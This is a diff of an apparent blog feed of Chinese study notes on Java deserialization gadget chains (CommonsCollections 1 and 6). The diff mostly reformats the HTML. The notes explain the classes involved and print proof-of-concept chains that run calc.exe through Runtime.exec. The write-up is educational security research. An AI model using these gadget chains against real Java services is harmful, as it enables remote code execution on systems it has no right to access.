@@ -152,7 +152,7 @@ public class POC1 &amp;#123;
     &amp;#125;
 &amp;#125;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;首先是这里在序列化的时候就已经触发了命令执行，这里跟URLDNS的思想一样，在序列化的阶段的put触发，这里其实不改也能用，但是会再本地就进行过命令执行，会有干扰，那么最简单的思想就是在put前将链子中断，put之后再将链子指向改为正确的&lt;/p&gt;
+&lt;p&gt;首先是这里在序列化的时候就已经触发了命令执行，这里跟URLDNS的思想一样，在序列化的阶段的put触发,那么最简单的思想就是在put前将链子中断，put之后再将链子指向改为正确的&lt;/p&gt;
 &lt;pre&gt;&lt;code class=&#34;java&#34;&gt;package CommonsCollection.Clown_CC6;
 
 import org.apache.commons.collections.Transformer;
@@ -214,6 +214,7 @@ public class POC1 &amp;#123;
 &lt;p&gt;这里进到hash，一直进到get方法&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305181945986.png&#34; alt=&#34;image-20230518194538929&#34;&gt;&lt;/p&gt;
 &lt;p&gt;可以看到这里会判断LazyMap里面有没有key，开始是没有的,然后回put进去一个键值对，所以如果这里不删除就会导致在反序列化的之后不能进到if，不能调用factory.Transform函数&lt;/p&gt;
+&lt;h3 id=&#34;总结&#34;&gt;&lt;a href=&#34;#总结&#34; class=&#34;headerlink&#34; title=&#34;总结&#34;&gt;&lt;/a&gt;总结&lt;/h3&gt;&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230709172122054.png&#34; alt=&#34;image-20230709172122054&#34;&gt;&lt;/p&gt;
 </content>
         <category term="java安全" scheme="https://blog.xcu.icu/categories/java%E5%AE%89%E5%85%A8/" />
         <category term="CC6" scheme="https://blog.xcu.icu/tags/CC6/" />
@@ -223,16 +224,12 @@ public class POC1 &amp;#123;
         <id>https://blog.xcu.icu/2023/05/16/CommonsCollections-1/</id>
         <title>ConmonsCollection-1</title>
         <link rel="alternate" href="https://blog.xcu.icu/2023/05/16/CommonsCollections-1/"/>
-        <content type="html">&lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
-&lt;p&gt;前面跟着 p 牛知识星球的文章学习 java 反序列的基础知识，RMI 和 URLDNS 链，现在大概算是勉强看到门？接下来准备开始学习 CommonsCollections 这个系列的利用链，以本篇记录&lt;/p&gt;
-&lt;h2 id=&#34;commons-collections-1&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#commons-collections-1&#34;&gt;#&lt;/a&gt; Commons Collections-1&lt;/h2&gt;
-&lt;p&gt;这个 java 库是为了额外提供一些集合类和工具，这些类和工具不是标准的 java 集合框架的一部分，但是它可以更加方便的扩展集合的功能，它的出现主要是因为 java 集合框架的一些不足，使得开发人员更加高效的处理集合数据，它能够创建 “转换后的集合” 这些集合在每个元素被添加到集合中的时自动对其应用指定的转换。&lt;/p&gt;
-&lt;p&gt;知道为什么要有这个 Commons Collections 后，接下来先记录这个过程中涉及到的几个接口和类&lt;/p&gt;
-&lt;h3 id=&#34;前置知识&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前置知识&#34;&gt;#&lt;/a&gt; 前置知识&lt;/h3&gt;
-&lt;h4 id=&#34;transformer&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#transformer&#34;&gt;#&lt;/a&gt; Transformer&lt;/h4&gt;
-&lt;p&gt;它是  &lt;code&gt;org.apache.commons.collections.Transformer&lt;/code&gt;  接口中的一个方法，这个接口定义了一种将输入对象转换为输出对象的策略，常用于函数式编程中，可以视为一个以一个输入为参数，返回一个输出的函数， &lt;code&gt;Transformer(Object input)&lt;/code&gt;  方法方法接收 &lt;code&gt;Object类型的input&lt;/code&gt; ，处理后将 &lt;code&gt;Object返回&lt;/code&gt; ，这个方法实现定义了转换逻辑&lt;/p&gt;
-&lt;p&gt;下面是一个使用 Transformer 方法来将字符串列表转换为大写的形式&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;import org.apache.commons.collections.CollectionUtils;
+        <content type="html">&lt;h2 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前面跟着p牛知识星球的文章学习java反序列的基础知识，RMI和URLDNS链，现在大概算是勉强看到门？接下来准备开始学习CommonsCollections这个系列的利用链，以本篇记录&lt;/p&gt;
+&lt;h2 id=&#34;Commons-Collections-1&#34;&gt;&lt;a href=&#34;#Commons-Collections-1&#34; class=&#34;headerlink&#34; title=&#34;Commons Collections-1&#34;&gt;&lt;/a&gt;Commons Collections-1&lt;/h2&gt;&lt;p&gt;这个java库是为了额外提供一些集合类和工具，这些类和工具不是标准的java集合框架的一部分，但是它可以更加方便的扩展集合的功能，它的出现主要是因为java集合框架的一些不足，使得开发人员更加高效的处理集合数据，它能够创建“转换后的集合”这些集合在每个元素被添加到集合中的时自动对其应用指定的转换。&lt;/p&gt;
+&lt;p&gt;知道为什么要有这个Commons Collections后，接下来先记录这个过程中涉及到的几个接口和类&lt;/p&gt;
+&lt;h3 id=&#34;前置知识&#34;&gt;&lt;a href=&#34;#前置知识&#34; class=&#34;headerlink&#34; title=&#34;前置知识&#34;&gt;&lt;/a&gt;前置知识&lt;/h3&gt;&lt;h4 id=&#34;Transformer&#34;&gt;&lt;a href=&#34;#Transformer&#34; class=&#34;headerlink&#34; title=&#34;Transformer&#34;&gt;&lt;/a&gt;Transformer&lt;/h4&gt;&lt;p&gt;它是 &lt;code&gt;org.apache.commons.collections.Transformer&lt;/code&gt;接口中的一个方法，这个接口定义了一种将输入对象转换为输出对象的策略，常用于函数式编程中，可以视为一个以一个输入为参数，返回一个输出的函数，&lt;code&gt;Transformer(Object input)&lt;/code&gt;方法方法接收&lt;code&gt;Object类型的input&lt;/code&gt;，处理后将&lt;code&gt;Object返回&lt;/code&gt;，这个方法实现定义了转换逻辑&lt;/p&gt;
+&lt;p&gt;下面是一个使用Transformer方法来将字符串列表转换为大写的形式&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;java&#34;&gt;import org.apache.commons.collections.CollectionUtils;
 import org.apache.commons.collections.Transformer;
 
 import java.util.Arrays;
@@ -251,20 +248,16 @@ public class TransformerTest &amp;#123;
     &amp;#125;
 &amp;#125;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304211600780.png&#34; alt=&#34;image-20230421160051535&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;transformedmap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#transformedmap&#34;&gt;#&lt;/a&gt; TransformedMap&lt;/h4&gt;
-&lt;p&gt;org.apache.commons.collections.map.TransformedMap 它实现了  &lt;code&gt;java.util.Map&lt;/code&gt;  接口，它用来对 Map 中的键或值进行转换，在其构造方法 &lt;code&gt;TransformedMap&lt;/code&gt;  中需要有两个参数一个要转换的 Map 对象和两个 Transformer 对象，分别对键和值进行转换，在使用 &lt;code&gt;TransformedMap&lt;/code&gt;  时所有的 get，put，remove 方法在调用的时候都会自动调用这个 Transformer 对象&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &amp;#123;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304211600780.png&#34; alt=&#34;image-20230421160051535&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;TransformedMap&#34;&gt;&lt;a href=&#34;#TransformedMap&#34; class=&#34;headerlink&#34; title=&#34;TransformedMap&#34;&gt;&lt;/a&gt;TransformedMap&lt;/h4&gt;&lt;p&gt;org.apache.commons.collections.map.TransformedMap它实现了 &lt;code&gt;java.util.Map&lt;/code&gt; 接口，它用来对Map中的键或值进行转换，在其构造方法&lt;code&gt;TransformedMap&lt;/code&gt;中需要有两个参数一个要转换的Map对象和两个Transformer对象，分别对键和值进行转换，在使用&lt;code&gt;TransformedMap&lt;/code&gt;时所有的get，put，remove方法在调用的时候都会自动调用这个Transformer对象&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;java&#34;&gt;    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &amp;#123;
         return new TransformedMap(map, keyTransformer, valueTransformer);
     &amp;#125;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id=&#34;lazymap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#lazymap&#34;&gt;#&lt;/a&gt; LazyMap&lt;/h4&gt;
-&lt;p&gt;&lt;code&gt;org.apache.commons.collections.map.LazyMap&lt;/code&gt;  提供了一个创建动态生成值的 Map 的方法，它与 TransformedMap 很类似，区别在于 LazyMap 调用 get () 方法的时候，如果传入的 key 不存在的时候会触发相对应的 Transformer 的 transform () 方法&lt;/p&gt;
-&lt;h4 id=&#34;defaultedmap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#defaultedmap&#34;&gt;#&lt;/a&gt; DefaultedMap&lt;/h4&gt;
-&lt;p&gt;&lt;code&gt;org.apache.commons.collections.map.DefaultedMap&lt;/code&gt;  与上面的 LazyMap 方法相同，在调用 get () 方法的时候会自动调用 Transformer 方法&lt;/p&gt;
-&lt;h4 id=&#34;constanttransformer&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#constanttransformer&#34;&gt;#&lt;/a&gt; ConstantTransformer&lt;/h4&gt;
-&lt;p&gt;&lt;code&gt;org.apache.commons.collections.functors.ConstantTransformer&lt;/code&gt;  提供了一个始终返回常量值的 Transformer 实现，在初始化的时候存储了一个 Object，这个类用于和 &lt;code&gt;ChainedTransformer&lt;/code&gt;  配合，将其结果传入 &lt;code&gt;InvokerTransformer&lt;/code&gt;  来调用我们指定的类的指定方法&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class ConstantTransformer implements Transformer, Serializable &amp;#123;
+&lt;h4 id=&#34;LazyMap&#34;&gt;&lt;a href=&#34;#LazyMap&#34; class=&#34;headerlink&#34; title=&#34;LazyMap&#34;&gt;&lt;/a&gt;LazyMap&lt;/h4&gt;&lt;p&gt;&lt;code&gt;org.apache.commons.collections.map.LazyMap&lt;/code&gt; 提供了一个创建动态生成值的Map的方法，它与TransformedMap很类似，区别在于LazyMap调用get()方法的时候，如果传入的key不存在的时候会触发相对应的Transformer的transform()方法&lt;/p&gt;
+&lt;h4 id=&#34;DefaultedMap&#34;&gt;&lt;a href=&#34;#DefaultedMap&#34; class=&#34;headerlink&#34; title=&#34;DefaultedMap&#34;&gt;&lt;/a&gt;DefaultedMap&lt;/h4&gt;&lt;p&gt;&lt;code&gt;org.apache.commons.collections.map.DefaultedMap&lt;/code&gt;与上面的LazyMap方法相同，在调用get()方法的时候会自动调用Transformer方法&lt;/p&gt;
+&lt;h4 id=&#34;ConstantTransformer&#34;&gt;&lt;a href=&#34;#ConstantTransformer&#34; class=&#34;headerlink&#34; title=&#34;ConstantTransformer&#34;&gt;&lt;/a&gt;ConstantTransformer&lt;/h4&gt;&lt;p&gt;&lt;code&gt;org.apache.commons.collections.functors.ConstantTransformer&lt;/code&gt;提供了一个始终返回常量值的Transformer实现，在初始化的时候存储了一个Object，这个类用于和&lt;code&gt;ChainedTransformer&lt;/code&gt;配合，将其结果传入&lt;code&gt;InvokerTransformer&lt;/code&gt;来调用我们指定的类的指定方法&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;java&#34;&gt;public class ConstantTransformer implements Transformer, Serializable &amp;#123;
     private static final long serialVersionUID = 6374440726369055124L;
     public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null);
     private final Object iConstant;
@@ -286,16 +279,15 @@ public class TransformerTest &amp;#123;
     &amp;#125;
 &amp;#125;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id=&#34;invokertrabsformer&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#invokertrabsformer&#34;&gt;#&lt;/a&gt; InvokerTrabsformer&lt;/h4&gt;
-&lt;p&gt;实现 Transformer 接口的一个类，这个类可以用来 &lt;code&gt;执行任意方法&lt;/code&gt; ，这也是反序列化能够执行仍以代码的关键&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &amp;#123;
+&lt;h4 id=&#34;InvokerTrabsformer&#34;&gt;&lt;a href=&#34;#InvokerTrabsformer&#34; class=&#34;headerlink&#34; title=&#34;InvokerTrabsformer&#34;&gt;&lt;/a&gt;InvokerTrabsformer&lt;/h4&gt;&lt;p&gt;实现Transformer接口的一个类，这个类可以用来&lt;code&gt;执行任意方法&lt;/code&gt;，这也是反序列化能够执行仍以代码的关键&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;java&#34;&gt;    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &amp;#123;
         this.iMethodName = methodName;
         this.iParamTypes = paramTypes;
         this.iArgs = args;
     &amp;#125;
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;demo：&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package Clown_CC1;
+&lt;pre&gt;&lt;code class=&#34;java&#34;&gt;package Clown_CC1;
 
 import org.apache.commons.collections.functors.InvokerTransformer;
 
@@ -306,10 +298,9 @@ public class InvokerTransformerTest &amp;#123;
     &amp;#125;
 &amp;#125;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304211920865.png&#34; alt=&#34;image-20230421192003749&#34; /&gt;&lt;/p&gt;
-&lt;h4 id=&#34;chainedtransformer&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#chainedtransformer&#34;&gt;#&lt;/a&gt; ChainedTransformer&lt;/h4&gt;
-&lt;p&gt;实现 Transformer 接口的一个类，他的作用是将内部的多个 Transformer 串在一起&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;    public ChainedTransformer(Transformer[] transformers) &amp;#123;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304211920865.png&#34; alt=&#34;image-20230421192003749&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;ChainedTransformer&#34;&gt;&lt;a href=&#34;#ChainedTransformer&#34; class=&#34;headerlink&#34; title=&#34;ChainedTransformer&#34;&gt;&lt;/a&gt;ChainedTransformer&lt;/h4&gt;&lt;p&gt;实现Transformer接口的一个类，他的作用是将内部的多个Transformer串在一起&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;java&#34;&gt;    public ChainedTransformer(Transformer[] transformers) &amp;#123;
         this.iTransformers = transformers;
     &amp;#125;
 
@@ -321,9 +312,8 @@ public class InvokerTransformerTest &amp;#123;
         return object;
     &amp;#125;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;h3 id=&#34;demo&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#demo&#34;&gt;#&lt;/a&gt; demo&lt;/h3&gt;
-&lt;p&gt;这里先贴一下 p 牛的代码，我加了一些注释&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;    public static void main(String[] args) throws Exception &amp;#123;
+&lt;h3 id=&#34;demo&#34;&gt;&lt;a href=&#34;#demo&#34; class=&#34;headerlink&#34; title=&#34;demo&#34;&gt;&lt;/a&gt;demo&lt;/h3&gt;&lt;p&gt;这里先贴一下p牛的代码，我加了一些注释&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;java&#34;&gt;    public static void main(String[] args) throws Exception &amp;#123;
         Transformer[] transformers = new Transformer[]&amp;#123;//创建了一个Transformer数组
                 new ConstantTransformer(Runtime.getRuntime()),//第一个Transformer返回JVM运行时对象
                 new InvokerTransformer(&amp;quot;exec&amp;quot;, new Class[]&amp;#123;String.class&amp;#125;,
@@ -335,10 +325,9 @@ public class InvokerTransformerTest &amp;#123;
         outerMap.put(&amp;quot;test&amp;quot;, &amp;quot;xxxx&amp;quot;);//这里调用put方法（触发点）
     &amp;#125;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里可以看到，通过 ChainedTransformer 将 &lt;code&gt;ConstantTransformer&lt;/code&gt;  和 &lt;code&gt;InvokerTransformer&lt;/code&gt;  连接在一起，将 &lt;code&gt;ChainedTransformer&lt;/code&gt;  设置为 &lt;code&gt;map&lt;/code&gt;  装饰器的处理方法，调用 &lt;code&gt;TransformedMap&lt;/code&gt;  的 &lt;code&gt;put()&lt;/code&gt;  方法时会触发 &lt;code&gt;Transformer&lt;/code&gt;  链的调用方法。&lt;/p&gt;
-&lt;h3 id=&#34;annotationinvocationhandler&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#annotationinvocationhandler&#34;&gt;#&lt;/a&gt; AnnotationInvocationHandler&lt;/h3&gt;
-&lt;p&gt;上面提到使用这个 put 调用，但是在实际序列化的时候没有办法手工执行这个 put，我们需要去寻找找到类似的写入操作在 readObject 中，这样反序列化的时候就能够成功触发，AnnotationInvocationHandler 就是这样一个类，这里我是 jdk8u65&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;    private void readObject(java.io.ObjectInputStream s)
+&lt;p&gt;这里可以看到，通过ChainedTransformer将&lt;code&gt;ConstantTransformer&lt;/code&gt;和&lt;code&gt;InvokerTransformer&lt;/code&gt;连接在一起，将&lt;code&gt;ChainedTransformer&lt;/code&gt;设置为&lt;code&gt;map&lt;/code&gt;装饰器的处理方法，调用&lt;code&gt;TransformedMap&lt;/code&gt;的&lt;code&gt;put()&lt;/code&gt;方法时会触发&lt;code&gt;Transformer&lt;/code&gt;链的调用方法。&lt;/p&gt;
+&lt;h3 id=&#34;AnnotationInvocationHandler&#34;&gt;&lt;a href=&#34;#AnnotationInvocationHandler&#34; class=&#34;headerlink&#34; title=&#34;AnnotationInvocationHandler&#34;&gt;&lt;/a&gt;AnnotationInvocationHandler&lt;/h3&gt;&lt;p&gt;上面提到使用这个put调用，但是在实际序列化的时候没有办法手工执行这个put，我们需要去寻找找到类似的写入操作在readObject中，这样反序列化的时候就能够成功触发，AnnotationInvocationHandler就是这样一个类，这里我是jdk8u65&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;java&#34;&gt;    private void readObject(java.io.ObjectInputStream s)
         throws java.io.IOException, ClassNotFoundException &amp;#123;
         s.defaultReadObject();
 
@@ -372,8 +361,8 @@ public class InvokerTransformerTest &amp;#123;
         &amp;#125;
     &amp;#125;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;code&gt; for (Map.Entry&amp;lt;String, Object&amp;gt; memberValue : memberValues.entrySet()) &amp;#123;&lt;/code&gt; 和  &lt;code&gt;memberValue.setValue&lt;/code&gt;  这个地方调用了 set 方法，可以作为触发点&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;    AnnotationInvocationHandler(Class&amp;lt;? extends Annotation&amp;gt; type, Map&amp;lt;String, Object&amp;gt; memberValues) &amp;#123;
+&lt;p&gt;&lt;code&gt; for (Map.Entry&amp;lt;String, Object&amp;gt; memberValue : memberValues.entrySet()) &amp;#123;&lt;/code&gt;和 &lt;code&gt;memberValue.setValue&lt;/code&gt;这个地方调用了set方法，可以作为触发点&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;java&#34;&gt;    AnnotationInvocationHandler(Class&amp;lt;? extends Annotation&amp;gt; type, Map&amp;lt;String, Object&amp;gt; memberValues) &amp;#123;
         Class&amp;lt;?&amp;gt;[] superInterfaces = type.getInterfaces();
         if (!type.isAnnotation() ||
             superInterfaces.length != 1 ||
@@ -383,30 +372,29 @@ public class InvokerTransformerTest &amp;#123;
         this.memberValues = memberValues;
     &amp;#125;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;在构造方法中第一个参数是 Annotation 实现类的 class 对象，第二个对象是一个 Map，键为 String，值为 Object，如果 type 对象的父类接口不是唯一的且为 &lt;code&gt;Annotation.class&lt;/code&gt;  则不会讲两个参数初始化到对象中&lt;/p&gt;
-&lt;p&gt;再看上面重写的 readObject 方法，先通过 &lt;code&gt;annotationType = AnnotationType.getInstance(type);&lt;/code&gt;  来获取 type 的对应的 &lt;code&gt;AnnotationType&lt;/code&gt;  的对象，接着获取 &lt;code&gt;memberTypes&lt;/code&gt;  属性接着遍历了它的所有元素，并依次设置值，这里就是 poc 的起点了&lt;/p&gt;
-&lt;p&gt;这里去要创建一个 AnnotationInvocationHandler 对象，并将前面构造的 HashMap 设置进来&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;        Class clazz = Class.forName(&amp;quot;sun.reflect.annotation.AnnotationInvocationHandler&amp;quot;);
+&lt;p&gt;在构造方法中第一个参数是Annotation实现类的class对象，第二个对象是一个Map，键为String，值为Object，如果type对象的父类接口不是唯一的且为&lt;code&gt;Annotation.class&lt;/code&gt;则不会讲两个参数初始化到对象中&lt;/p&gt;
+&lt;p&gt;再看上面重写的readObject方法，先通过&lt;code&gt;annotationType = AnnotationType.getInstance(type);&lt;/code&gt;来获取type的对应的&lt;code&gt;AnnotationType&lt;/code&gt;的对象，接着获取&lt;code&gt;memberTypes&lt;/code&gt;属性接着遍历了它的所有元素，并依次设置值，这里就是poc的起点了&lt;/p&gt;
+&lt;p&gt;这里去要创建一个AnnotationInvocationHandler对象，并将前面构造的HashMap设置进来&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;java&#34;&gt;        Class clazz = Class.forName(&amp;quot;sun.reflect.annotation.AnnotationInvocationHandler&amp;quot;);
         Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
         constructor.setAccessible(true);
         Object obj = constructor.newInstance(Retention.class,outerMap);
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;这里上面 p 牛直接用 Runtime 类是没有实现 java.io.Serializable 接口的，所以不允许被序列化，p 牛也是给了解决方法通过反射区调用&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;Method f = Runtime.class.getMethod(&amp;quot;getRuntime&amp;quot;);
+&lt;p&gt;这里上面p牛直接用Runtime类是没有实现 java.io.Serializable 接口的，所以不允许被序列化，p牛也是给了解决方法通过反射区调用&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;java&#34;&gt;Method f = Runtime.class.getMethod(&amp;quot;getRuntime&amp;quot;);
 Runtime r = (Runtime) f.invoke(null);
 r.exec(&amp;quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;quot;);
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;编写成 Transformer 的写法&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;        Transformer[] transformers = new Transformer[] &amp;#123;
+&lt;p&gt;编写成Transformer的写法&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;java&#34;&gt;        Transformer[] transformers = new Transformer[] &amp;#123;
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer(&amp;quot;getMethod&amp;quot;, new Class[] &amp;#123; String.class, Class[].class &amp;#125;, new Object[] &amp;#123; &amp;quot;getRuntime&amp;quot;, new Class[0] &amp;#125;),
                 new InvokerTransformer(&amp;quot;invoke&amp;quot;, new Class[] &amp;#123; Object.class, Object[].class &amp;#125;, new Object[] &amp;#123; null, new Object[0] &amp;#125;),
                 new InvokerTransformer(&amp;quot;exec&amp;quot;, new Class[] &amp;#123; String.class &amp;#125;, new String[] &amp;#123;&amp;quot;C:\\Windows\\System32\\calc.exe&amp;quot; &amp;#125;),
         &amp;#125;;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;下面贴一下完整的 poc&lt;/p&gt;
-&lt;h3 id=&#34;poc_transformer&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#poc_transformer&#34;&gt;#&lt;/a&gt; poc_Transformer&lt;/h3&gt;
-&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package Clown_CC1;
+&lt;p&gt;下面贴一下完整的poc&lt;/p&gt;
+&lt;h3 id=&#34;poc-Transformer&#34;&gt;&lt;a href=&#34;#poc-Transformer&#34; class=&#34;headerlink&#34; title=&#34;poc_Transformer&#34;&gt;&lt;/a&gt;poc_Transformer&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;java&#34;&gt;package Clown_CC1;
 
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
@@ -459,18 +447,17 @@ public class POC1 &amp;#123;
     &amp;#125;
 &amp;#125;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304230054334.png&#34; alt=&#34;image-20230423005357596&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;poc_lazymap&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#poc_lazymap&#34;&gt;#&lt;/a&gt; poc_LazyMap&lt;/h3&gt;
-&lt;p&gt;上面是跟着 p 牛写的链子，这里也是看到 ysoserial 中的 CommonsCollections1 的 payload 中使用的是 LazyMap&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304230056665.png&#34; alt=&#34;image-20230423005656630&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;LazyMap 和 TransformedMap 类似，都来自于 Common-Collections 库，并继承 AbstractMapDecorator，在 ysoserial 的源码中主要是利用 LazyMap 的 get 这个方法，这里 LazyMap 的作用是 “懒加载”，在 get 找不到值的时候，它会调用 factory.transform 方法去获取一个值&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305161332751.png&#34; alt=&#34;image-20230516133251707&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这个 factory 是可控的&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305161335157.png&#34; alt=&#34;image-20230516133510116&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;相比于 TransformedMap 的利用方法，LazyMap 后续利用稍微复杂一些，原因是在 sun.reflect.annotation.AnnotationInvocationHandler 的 readObject 方法中并没有直接调用到 Map 的 get 方法，所以在 ysoserial 中利用的是 sun.reflect.annotation.AnnotationInvocationHandler 的 invoke 方法&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305161337219.png&#34; alt=&#34;image-20230516133753158&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;而想要调用这个 invoke 就需要使用到 java 的对象代理&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package Clown_CC1;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304230054334.png&#34; alt=&#34;image-20230423005357596&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;poc-LazyMap&#34;&gt;&lt;a href=&#34;#poc-LazyMap&#34; class=&#34;headerlink&#34; title=&#34;poc_LazyMap&#34;&gt;&lt;/a&gt;poc_LazyMap&lt;/h3&gt;&lt;p&gt;上面是跟着p牛写的链子，这里也是看到ysoserial中的CommonsCollections1的payload中使用的是LazyMap&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304230056665.png&#34; alt=&#34;image-20230423005656630&#34;&gt;&lt;/p&gt;
+&lt;p&gt;LazyMap和TransformedMap类似，都来自于Common-Collections库，并继承 AbstractMapDecorator，在ysoserial的源码中主要是利用LazyMap的get这个方法，这里LazyMap 的作用是“懒加载”，在get找不到值的时候，它会调用 factory.transform 方法去获取一个值&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305161332751.png&#34; alt=&#34;image-20230516133251707&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这个factory是可控的&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305161335157.png&#34; alt=&#34;image-20230516133510116&#34;&gt;&lt;/p&gt;
+&lt;p&gt;相比于TransformedMap的利用方法，LazyMap后续利用稍微复杂一些，原因是在sun.reflect.annotation.AnnotationInvocationHandler 的readObject方法中并没有直接调用到 Map的get方法，所以在ysoserial中利用的是sun.reflect.annotation.AnnotationInvocationHandler的invoke方法&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305161337219.png&#34; alt=&#34;image-20230516133753158&#34;&gt;&lt;/p&gt;
+&lt;p&gt;而想要调用这个invoke就需要使用到java的对象代理&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;java&#34;&gt;package Clown_CC1;
 
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
@@ -495,8 +482,8 @@ public class LazyMap_CC1 &amp;#123;
     &amp;#125;
 &amp;#125;
 &lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;同样上面的是我手动去触发的 get 方法，下面用 java 对象代理来修改完整的 poc 链&lt;/p&gt;
